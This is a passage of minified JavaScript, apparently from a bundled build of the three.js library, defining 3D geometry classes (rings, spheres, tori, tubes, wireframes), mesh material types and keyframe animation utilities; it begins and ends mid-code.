a;return(a=e.call(this)||this).type="PolyhedronGeometry",a.parameters={vertices:t,indices:n,radius:r,detail:i},a.fromBufferGeometry(new Ao(t,n,r,i)),a.mergeVertices(),a}return te(t,e),t}(oo),ss=function(e){function t(t,n,r,i,a,o){var s;(s=e.call(this)||this).type="RingBufferGeometry",s.parameters={innerRadius:t,outerRadius:n,thetaSegments:r,phiSegments:i,thetaStart:a,thetaLength:o},t=t||.5,n=n||1,a=void 0!==a?a:0,o=void 0!==o?o:2*Math.PI,r=void 0!==r?Math.max(3,r):8;for(var l=[],c=[],u=[],d=[],p=t,h=(n-t)/(i=void 0!==i?Math.max(1,i):1),f=new he,A=new ie,m=0;m<=i;m++){for(var v=0;v<=r;v++){var g=a+v/r*o;f.x=p*Math.cos(g),f.y=p*Math.sin(g),c.push(f.x,f.y,f.z),u.push(0,0,1),A.x=(f.x/n+1)/2,A.y=(f.y/n+1)/2,d.push(A.x,A.y)}p+=h}for(var y=0;y<i;y++)for(var b=y*(r+1),_=0;_<r;_++){var w=_+b,C=w,x=w+r+1,S=w+r+2,k=w+1;l.push(C,x,k),l.push(x,S,k)}return s.setIndex(l),s.setAttribute("position",new qt(c,3)),s.setAttribute("normal",new qt(u,3)),s.setAttribute("uv",new qt(d,2)),s}return te(t,e),t}(sn),ls=function(e){function t(t,n,r,i,a,o){var s;return(s=e.call(this)||this).type="RingGeometry",s.parameters={innerRadius:t,outerRadius:n,thetaSegments:r,phiSegments:i,thetaStart:a,thetaLength:o},s.fromBufferGeometry(new ss(t,n,r,i,a,o)),s.mergeVertices(),s}return te(t,e),t}(oo),cs=function(e){function t(t,n){var r;(r=e.call(this)||this).type="ShapeBufferGeometry",r.parameters={shapes:t,curveSegments:n},n=n||12;var i=[],a=[],o=[],s=[],l=0,c=0;if(!1===Array.isArray(t))d(t);else for(var u=0;u<t.length;u++)d(t[u]),r.addGroup(l,c,u),l+=c,c=0;function d(e){var t=a.length/3,r=e.extractPoints(n),l=r.shape,u=r.holes;!1===Qo.isClockWise(l)&&(l=l.reverse());for(var d=0,p=u.length;d<p;d++){var h=u[d];!0===Qo.isClockWise(h)&&(u[d]=h.reverse())}for(var f=Qo.triangulateShape(l,u),A=0,m=u.length;A<m;A++){var v=u[A];l=l.concat(v)}for(var g=0,y=l.length;g<y;g++){var b=l[g];a.push(b.x,b.y,0),o.push(0,0,1),s.push(b.x,b.y)}for(var _=0,w=f.length;_<w;_++){var C=f[_],x=C[0]+t,S=C[1]+t,k=C[2]+t;i.push(x,S,k),c+=3}}return r.setIndex(i),r.setAttribute("position",new qt(a,3)),r.setAttribute("normal",new qt(o,3)),r.setAttribute("uv",new qt(s,2)),r}return te(t,e),t.prototype.toJSON=function(){var e=sn.prototype.toJSON.call(this);return function(e,t){if(t.shapes=[],Array.isArray(e))for(var n=0,r=e.length;n<r;n++){var i=e[n];t.shapes.push(i.uuid)}else t.shapes.push(e.uuid);return t}(this.parameters.shapes,e)},t}(sn),us=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="ShapeGeometry","object"===_typeof2(n)&&(n=n.curveSegments),r.parameters={shapes:t,curveSegments:n},r.fromBufferGeometry(new cs(t,n)),r.mergeVertices(),r}return te(t,e),t.prototype.toJSON=function(){var e=oo.prototype.toJSON.call(this);return function(e,t){if(t.shapes=[],Array.isArray(e))for(var n=0,r=e.length;n<r;n++){var i=e[n];t.shapes.push(i.uuid)}else t.shapes.push(e.uuid);return t}(this.parameters.shapes,e)},t}(oo),ds=function(e){function t(t,n,r,i,a,o,s){var l;(l=e.call(this)||this).type="SphereBufferGeometry",l.parameters={radius:t,widthSegments:n,heightSegments:r,phiStart:i,phiLength:a,thetaStart:o,thetaLength:s},t=t||1,n=Math.max(3,Math.floor(n)||8),r=Math.max(2,Math.floor(r)||6),i=void 0!==i?i:0,a=void 0!==a?a:2*Math.PI,o=void 0!==o?o:0,s=void 0!==s?s:Math.PI;for(var c=Math.min(o+s,Math.PI),u=0,d=[],p=new he,h=new he,f=[],A=[],m=[],v=[],g=0;g<=r;g++){var y=[],b=g/r,_=0;0==g&&0==o?_=.5/n:g==r&&c==Math.PI&&(_=-.5/n);for(var w=0;w<=n;w++){var C=w/n;p.x=-t*Math.cos(i+C*a)*Math.sin(o+b*s),p.y=t*Math.cos(o+b*s),p.z=t*Math.sin(i+C*a)*Math.sin(o+b*s),A.push(p.x,p.y,p.z),h.copy(p).normalize(),m.push(h.x,h.y,h.z),v.push(C+_,1-b),y.push(u++)}d.push(y)}for(var x=0;x<r;x++)for(var S=0;S<n;S++){var k=d[x][S+1],M=d[x][S],B=d[x+1][S],E=d[x+1][S+1];(0!==x||0<o)&&f.push(k,M,E),(x!==r-1||c<Math.PI)&&f.push(M,B,E)}return l.setIndex(f),l.setAttribute("position",new qt(A,3)),l.setAttribute("normal",new qt(m,3)),l.setAttribute("uv",new qt(v,2)),l}return te(t,e),t}(sn),ps=function(e){function t(t,n,r,i,a,o,s){var l;return(l=e.call(this)||this).type="SphereGeometry",l.parameters={radius:t,widthSegments:n,heightSegments:r,phiStart:i,phiLength:a,thetaStart:o,thetaLength:s},l.fromBufferGeometry(new ds(t,n,r,i,a,o,s)),l.mergeVertices(),l}return te(t,e),t}(oo),hs=function(e){function t(t,n){var r;return(r=e.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],t,n)||this).type="TetrahedronBufferGeometry",r.parameters={radius:t,detail:n},r}return te(t,e),t}(Ao),fs=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="TetrahedronGeometry",r.parameters={radius:t,detail:n},r.fromBufferGeometry(new hs(t,n)),r.mergeVertices(),r}return te(t,e),t}(oo),As=function(e){function t(t,n){var r,i=(n=n||{}).font;if(!i||!i.isFont)return new sn||ne(r);var a=i.generateShapes(t,n.size);return n.depth=void 0!==n.height?n.height:50,void 0===n.bevelThickness&&(n.bevelThickness=10),void 0===n.bevelSize&&(n.bevelSize=8),void 0===n.bevelEnabled&&(n.bevelEnabled=!1),(r=e.call(this,a,n)||this).type="TextBufferGeometry",r}return te(t,e),t}(Ko),ms=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="TextGeometry",r.parameters={text:t,parameters:n},r.fromBufferGeometry(new As(t,n)),r.mergeVertices(),r}return te(t,e),t}(oo),vs=function(e){function t(t,n,r,i,a){var o;(o=e.call(this)||this).type="TorusBufferGeometry",o.parameters={radius:t,tube:n,radialSegments:r,tubularSegments:i,arc:a},t=t||1,n=n||.4,r=Math.floor(r)||8,i=Math.floor(i)||6,a=a||2*Math.PI;for(var s=[],l=[],c=[],u=[],d=new he,p=new he,h=new he,f=0;f<=r;f++)for(var A=0;A<=i;A++){var m=A/i*a,v=f/r*Math.PI*2;p.x=(t+n*Math.cos(v))*Math.cos(m),p.y=(t+n*Math.cos(v))*Math.sin(m),p.z=n*Math.sin(v),l.push(p.x,p.y,p.z),d.x=t*Math.cos(m),d.y=t*Math.sin(m),h.subVectors(p,d).normalize(),c.push(h.x,h.y,h.z),u.push(A/i),u.push(f/r)}for(var g=1;g<=r;g++)for(var y=1;y<=i;y++){var b=(i+1)*g+y-1,_=(i+1)*(g-1)+y-1,w=(i+1)*(g-1)+y,C=(i+1)*g+y;s.push(b,_,C),s.push(_,w,C)}return o.setIndex(s),o.setAttribute("position",new qt(l,3)),o.setAttribute("normal",new qt(c,3)),o.setAttribute("uv",new qt(u,2)),o}return te(t,e),t}(sn),gs=function(e){function t(t,n,r,i,a){var o;return(o=e.call(this)||this).type="TorusGeometry",o.parameters={radius:t,tube:n,radialSegments:r,tubularSegments:i,arc:a},o.fromBufferGeometry(new vs(t,n,r,i,a)),o.mergeVertices(),o}return te(t,e),t}(oo),ys=function(e){function t(t,n,r,i,a,o){var s;(s=e.call(this)||this).type="TorusKnotBufferGeometry",s.parameters={radius:t,tube:n,tubularSegments:r,radialSegments:i,p:a,q:o},t=t||1,n=n||.4,r=Math.floor(r)||64,i=Math.floor(i)||8,a=a||2,o=o||3;for(var l=[],c=[],u=[],d=[],p=new he,h=new he,f=new he,A=new he,m=new he,v=new he,g=new he,y=0;y<=r;++y){var b=y/r*a*Math.PI*2;P(b,a,o,t,f),P(b+.01,a,o,t,A),v.subVectors(A,f),g.addVectors(A,f),m.crossVectors(v,g),g.crossVectors(m,v),m.normalize(),g.normalize();for(var _=0;_<=i;++_){var w=_/i*Math.PI*2,C=-n*Math.cos(w),x=n*Math.sin(w);p.x=f.x+(C*g.x+x*m.x),p.y=f.y+(C*g.y+x*m.y),p.z=f.z+(C*g.z+x*m.z),c.push(p.x,p.y,p.z),h.subVectors(p,f).normalize(),u.push(h.x,h.y,h.z),d.push(y/r),d.push(_/i)}}for(var S=1;S<=r;S++)for(var k=1;k<=i;k++){var M=(i+1)*(S-1)+(k-1),B=(i+1)*S+(k-1),E=(i+1)*S+k,T=(i+1)*(S-1)+k;l.push(M,B,T),l.push(B,E,T)}function P(e,t,n,r,i){var a=Math.cos(e),o=Math.sin(e),s=n/t*e,l=Math.cos(s);i.x=r*(2+l)*.5*a,i.y=r*(2+l)*o*.5,i.z=r*Math.sin(s)*.5}return s.setIndex(l),s.setAttribute("position",new qt(c,3)),s.setAttribute("normal",new qt(u,3)),s.setAttribute("uv",new qt(d,2)),s}return te(t,e),t}(sn),bs=function(e){function t(t,n,r,i,a,o,s){var l;return(l=e.call(this)||this).type="TorusKnotGeometry",l.parameters={radius:t,tube:n,tubularSegments:r,radialSegments:i,p:a,q:o},l.fromBufferGeometry(new ys(t,n,r,i,a,o)),l.mergeVertices(),l}return te(t,e),t}(oo),_s=function(e){function t(t,n,r,i,a){var o;(o=e.call(this)||this).type="TubeBufferGeometry",o.parameters={path:t,tubularSegments:n,radius:r,radialSegments:i,closed:a},n=n||64,r=r||1,i=i||8,a=a||!1;var s=t.computeFrenetFrames(n,a);o.tangents=s.tangents,o.normals=s.normals,o.binormals=s.binormals;var l=new he,c=new he,u=new ie,d=new he,p=[],h=[],f=[],A=[];function m(e){d=t.getPointAt(e/n,d);for(var a=s.normals[e],o=s.binormals[e],u=0;u<=i;u++){var f=u/i*Math.PI*2,A=Math.sin(f),m=-Math.cos(f);c.x=m*a.x+A*o.x,c.y=m*a.y+A*o.y,c.z=m*a.z+A*o.z,c.normalize(),h.push(c.x,c.y,c.z),l.x=d.x+r*c.x,l.y=d.y+r*c.y,l.z=d.z+r*c.z,p.push(l.x,l.y,l.z)}}return function(){for(var e=0;e<n;e++)m(e);m(!1===a?n:0),function(){for(var e=0;e<=n;e++)for(var t=0;t<=i;t++)u.x=e/n,u.y=t/i,f.push(u.x,u.y)}(),function(){for(var e=1;e<=n;e++)for(var t=1;t<=i;t++){var r=(i+1)*(e-1)+(t-1),a=(i+1)*e+(t-1),o=(i+1)*e+t,s=(i+1)*(e-1)+t;A.push(r,a,s),A.push(a,o,s)}}()}(),o.setIndex(A),o.setAttribute("position",new qt(p,3)),o.setAttribute("normal",new qt(h,3)),o.setAttribute("uv",new qt(f,2)),o}return te(t,e),t.prototype.toJSON=function(){var e=sn.prototype.toJSON.call(this);return e.path=this.parameters.path.toJSON(),e},t}(sn),ws=function(e){function t(t,n,r,i,a,o){var s;(s=e.call(this)||this).type="TubeGeometry",s.parameters={path:t,tubularSegments:n,radius:r,radialSegments:i,closed:a};var l=new _s(t,n,r,i,a);return s.tangents=l.tangents,s.normals=l.normals,s.binormals=l.binormals,s.fromBufferGeometry(l),s.mergeVertices(),s}return te(t,e),t}(oo),Cs=function(e){function t(t){var n;(n=e.call(this)||this).type="WireframeGeometry";var r=[],i=[0,0],a={},o=["a","b","c"];if(t&&t.isGeometry){for(var s=t.faces,l=0,c=s.length;l<c;l++)for(var u=s[l],d=0;d<3;d++){var p=u[o[d]],h=u[o[(d+1)%3]];i[0]=Math.min(p,h),i[1]=Math.max(p,h);var f=i[0]+","+i[1];void 0===a[f]&&(a[f]={index1:i[0],index2:i[1]})}for(var A in a){var m=a[A],v=t.vertices[m.index1];r.push(v.x,v.y,v.z),v=t.vertices[m.index2],r.push(v.x,v.y,v.z)}}else if(t&&t.isBufferGeometry){var g=new he;if(null!==t.index){var y=t.attributes.position,b=t.index,_=t.groups;0===_.length&&(_=[{start:0,count:b.count,materialIndex:0}]);for(var w=0,C=_.length;w<C;++w)for(var x=_[w],S=x.start,k=S,M=S+x.count;k<M;k+=3)for(var B=0;B<3;B++){var E=b.getX(k+B),T=b.getX(k+(B+1)%3);i[0]=Math.min(E,T),i[1]=Math.max(E,T);var P=i[0]+","+i[1];void 0===a[P]&&(a[P]={index1:i[0],index2:i[1]})}for(var I in a){var F=a[I];g.fromBufferAttribute(y,F.index1),r.push(g.x,g.y,g.z),g.fromBufferAttribute(y,F.index2),r.push(g.x,g.y,g.z)}}else for(var L=t.attributes.position,O=0,N=L.count/3;O<N;O++)for(var D=0;D<3;D++){var R=3*O+D;g.fromBufferAttribute(L,R),r.push(g.x,g.y,g.z);var j=3*O+(D+1)%3;g.fromBufferAttribute(L,j),r.push(g.x,g.y,g.z)}}return n.setAttribute("position",new qt(r,3)),n}return te(t,e),t}(sn),xs=Object.freeze({__proto__:null,BoxGeometry:so,BoxBufferGeometry:Bn,CircleGeometry:co,CircleBufferGeometry:lo,ConeGeometry:ho,ConeBufferGeometry:fo,CylinderGeometry:po,CylinderBufferGeometry:uo,DodecahedronGeometry:vo,DodecahedronBufferGeometry:mo,EdgesGeometry:wo,ExtrudeGeometry:Xo,ExtrudeBufferGeometry:Ko,IcosahedronGeometry:Jo,IcosahedronBufferGeometry:Yo,LatheGeometry:es,LatheBufferGeometry:Zo,OctahedronGeometry:ns,OctahedronBufferGeometry:ts,ParametricGeometry:is,ParametricBufferGeometry:rs,PlaneGeometry:as,PlaneBufferGeometry:Vn,PolyhedronGeometry:os,PolyhedronBufferGeometry:Ao,RingGeometry:ls,RingBufferGeometry:ss,ShapeGeometry:us,ShapeBufferGeometry:cs,SphereGeometry:ps,SphereBufferGeometry:ds,TetrahedronGeometry:fs,TetrahedronBufferGeometry:hs,TextGeometry:ms,TextBufferGeometry:As,TorusGeometry:gs,TorusBufferGeometry:vs,TorusKnotGeometry:bs,TorusKnotBufferGeometry:ys,TubeGeometry:ws,TubeBufferGeometry:_s,WireframeGeometry:Cs});function Ss(e){Dt.call(this),this.type="ShadowMaterial",this.color=new Lt(0),this.transparent=!0,this.setValues(e)}function ks(e){In.call(this,e),this.type="RawShaderMaterial"}function Ms(e){Dt.call(this),this.defines={STANDARD:""},this.type="MeshStandardMaterial",this.color=new Lt(16777215),this.roughness=1,this.metalness=0,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Lt(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new ie(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.roughnessMap=null,this.metalnessMap=null,this.alphaMap=null,this.envMap=null,this.envMapIntensity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.vertexTangents=!1,this.setValues(e)}function Bs(e){Ms.call(this),this.defines={STANDARD:"",PHYSICAL:""},this.type="MeshPhysicalMaterial",this.clearcoat=0,this.clearcoatMap=null,this.clearcoatRoughness=0,this.clearcoatRoughnessMap=null,this.clearcoatNormalScale=new ie(1,1),this.clearcoatNormalMap=null,this.reflectivity=.5,Object.defineProperty(this,"ior",{get:function(){return(1+.4*this.reflectivity)/(1-.4*this.reflectivity)},set:function(e){this.reflectivity=J.clamp(2.5*(e-1)/(e+1),0,1)}}),this.sheen=null,this.transmission=0,this.transmissionMap=null,this.setValues(e)}function Es(e){Dt.call(this),this.type="MeshPhongMaterial",this.color=new Lt(16777215),this.specular=new Lt(1118481),this.shininess=30,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Lt(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new ie(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Ts(e){Dt.call(this),this.defines={TOON:""},this.type="MeshToonMaterial",this.color=new Lt(16777215),this.map=null,this.gradientMap=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Lt(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new ie(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.alphaMap=null,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Ps(e){Dt.call(this),this.type="MeshNormalMaterial",this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new ie(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Is(e){Dt.call(this),this.type="MeshLambertMaterial",this.color=new Lt(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Lt(0),this.emissiveIntensity=1,this.emissiveMap=null,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Fs(e){Dt.call(this),this.defines={MATCAP:""},this.type="MeshMatcapMaterial",this.color=new Lt(16777215),this.matcap=null,this.map=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new ie(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.alphaMap=null,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Ls(e){La.call(this),this.type="LineDashedMaterial",this.scale=1,this.dashSize=3,this.gapSize=1,this.setValues(e)}((Ss.prototype=Object.create(Dt.prototype)).constructor=Ss).prototype.isShadowMaterial=!0,Ss.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this},((ks.prototype=Object.create(In.prototype)).constructor=ks).prototype.isRawShaderMaterial=!0,((Ms.prototype=Object.create(Dt.prototype)).constructor=Ms).prototype.isMeshStandardMaterial=!0,Ms.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.defines={STANDARD:""},this.color.copy(e.color),this.roughness=e.roughness,this.metalness=e.metalness,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.roughnessMap=e.roughnessMap,this.metalnessMap=e.metalnessMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapIntensity=e.envMapIntensity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this.vertexTangents=e.vertexTangents,this},((Bs.prototype=Object.create(Ms.prototype)).constructor=Bs).prototype.isMeshPhysicalMaterial=!0,Bs.prototype.copy=function(e){return Ms.prototype.copy.call(this,e),this.defines={STANDARD:"",PHYSICAL:""},this.clearcoat=e.clearcoat,this.clearcoatMap=e.clearcoatMap,this.clearcoatRoughness=e.clearcoatRoughness,this.clearcoatRoughnessMap=e.clearcoatRoughnessMap,this.clearcoatNormalMap=e.clearcoatNormalMap,this.clearcoatNormalScale.copy(e.clearcoatNormalScale),this.reflectivity=e.reflectivity,e.sheen?this.sheen=(this.sheen||new Lt).copy(e.sheen):this.sheen=null,this.transmission=e.transmission,this.transmissionMap=e.transmissionMap,this},((Es.prototype=Object.create(Dt.prototype)).constructor=Es).prototype.isMeshPhongMaterial=!0,Es.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.specular.copy(e.specular),this.shininess=e.shininess,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},((Ts.prototype=Object.create(Dt.prototype)).constructor=Ts).prototype.isMeshToonMaterial=!0,Ts.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.gradientMap=e.gradientMap,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.alphaMap=e.alphaMap,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},((Ps.prototype=Object.create(Dt.prototype)).constructor=Ps).prototype.isMeshNormalMaterial=!0,Ps.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},((Is.prototype=Object.create(Dt.prototype)).constructor=Is).prototype.isMeshLambertMaterial=!0,Is.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},((Fs.prototype=Object.create(Dt.prototype)).constructor=Fs).prototype.isMeshMatcapMaterial=!0,Fs.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.defines={MATCAP:""},this.color.copy(e.color),this.matcap=e.matcap,this.map=e.map,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.alphaMap=e.alphaMap,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},((Ls.prototype=Object.create(La.prototype)).constructor=Ls).prototype.isLineDashedMaterial=!0,Ls.prototype.copy=function(e){return La.prototype.copy.call(this,e),this.scale=e.scale,this.dashSize=e.dashSize,this.gapSize=e.gapSize,this};var Os=Object.freeze({__proto__:null,ShadowMaterial:Ss,SpriteMaterial:ta,RawShaderMaterial:ks,ShaderMaterial:In,PointsMaterial:Qa,MeshPhysicalMaterial:Bs,MeshStandardMaterial:Ms,MeshPhongMaterial:Es,MeshToonMaterial:Ts,MeshNormalMaterial:Ps,MeshLambertMaterial:Is,MeshDepthMaterial:Oi,MeshDistanceMaterial:Ni,MeshBasicMaterial:Rt,MeshMatcapMaterial:Fs,LineDashedMaterial:Ls,LineBasicMaterial:La,Material:Dt}),Ns={arraySlice:function(e,t,n){return Ns.isTypedArray(e)?new e.constructor(e.subarray(t,void 0!==n?n:e.length)):e.slice(t,n)},convertArray:function(e,t,n){return!e||!n&&e.constructor===t?e:"number"==typeof t.BYTES_PER_ELEMENT?new t(e):Array.prototype.slice.call(e)},isTypedArray:function(e){return ArrayBuffer.isView(e)&&!(e instanceof DataView)},getKeyframeOrder:function(e){for(var t=e.length,n=new Array(t),r=0;r!==t;++r)n[r]=r;return n.sort((function(t,n){return e[t]-e[n]})),n},sortedArray:function(e,t,n){for(var r=e.length,i=new e.constructor(r),a=0,o=0;o!==r;++a)for(var s=n[a]*t,l=0;l!==t;++l)i[o++]=e[s+l];return i},flattenJSON:function(e,t,n,r){for(var i=1,a=e[0];void 0!==a&&void 0===a[r];)a=e[i++];if(void 0!==a){var o=a[r];if(void 0!==o)if(Array.isArray(o))for(;void 0!==(o=a[r])&&(t.push(a.time),n.push.apply(n,o)),void 0!==(a=e[i++]););else if(void 0!==o.toArray)for(;void 0!==(o=a[r])&&(t.push(a.time),o.toArray(n,n.length)),void 0!==(a=e[i++]););else for(;void 0!==(o=a[r])&&(t.push(a.time),n.push(o)),void 0!==(a=e[i++]););}},subclip:function(e,t,n,r,i){i=i||30;var a=e.clone();a.name=t;for(var o=[],s=0;s<a.tracks.length;++s){for(var l=a.tracks[s],c=l.getValueSize(),u=[],d=[],p=0;p<l.times.length;++p){var h=l.times[p]*i;if(!(h<n||r<=h)){u.push(l.times[p]);for(var f=0;f<c;++f)d.push(l.values[p*c+f])}}0!==u.length&&(l.times=Ns.convertArray(u,l.times.constructor),l.values=Ns.convertArray(d,l.values.constructor),o.push(l))}a.tracks=o;for(var A=1/0,m=0;m<a.tracks.length;++m)A>a.tracks[m].times[0]&&(A=a.tracks[m].times[0]);for(var v=0;v<a.tracks.length;++v)a.tracks[v].shift(-1*A);return a.resetDuration(),a},makeClipAdditive:function(e,t,n,r){void 0===t&&(t=0),void 0===n&&(n=e),(void 0===r||r<=0)&&(r=30);for(var i=n.tracks.length,a=t/r,o=function(t){var r=n.tracks[t],i=r.ValueTypeName;if("bool"===i||"string"===i)return"continue";var o=e.tracks.find((function(e){return e.name===r.name&&e.ValueTypeName===i}));if(void 0===o)return"continue";var s=0,l=r.getValueSize();r.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline&&(s=l/3);var c=0,u=o.getValueSize();o.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline&&(c=u/3);var d=r.times.length-1,p=void 0;if(a<=r.times[0]){var h=s,f=l-s;p=Ns.arraySlice(r.values,h,f)}else if(a>=r.times[d]){var A=d*l+s,m=A+l-s;p=Ns.arraySlice(r.values,A,m)}else{var v=r.createInterpolant(),g=s,y=l-s;v.evaluate(a),p=Ns.arraySlice(v.resultBuffer,g,y)}"quaternion"===i&&(new pe).fromArray(p).normalize().conjugate().toArray(p);for(var b=o.times.length,_=0;_<b;++_){var w=_*u+c;if("quaternion"===i)pe.multiplyQuaternionsFlat(o.values,w,p,0,o.values,w);else for(var C=u-2*c,x=0;x<C;++x)o.values[w+x]-=p[x]}},s=0;s<i;++s)o(s);return e.blendMode=2501,e}};function Ds(e,t,n,r){this.parameterPositions=e,this._cachedIndex=0,this.resultBuffer=void 0!==r?r:new t.constructor(n),this.sampleValues=t,this.valueSize=n}function Rs(e,t,n,r){Ds.call(this,e,t,n,r),this._weightPrev=-0,this._offsetPrev=-0,this._weightNext=-0,this._offsetNext=-0}function js(e,t,n,r){Ds.call(this,e,t,n,r)}function Us(e,t,n,r){Ds.call(this,e,t,n,r)}function $s(e,t,n,r){if(void 0===e)throw new Error("THREE.KeyframeTrack: track name is undefined");if(void 0===t||0===t.length)throw new Error("THREE.KeyframeTrack: no 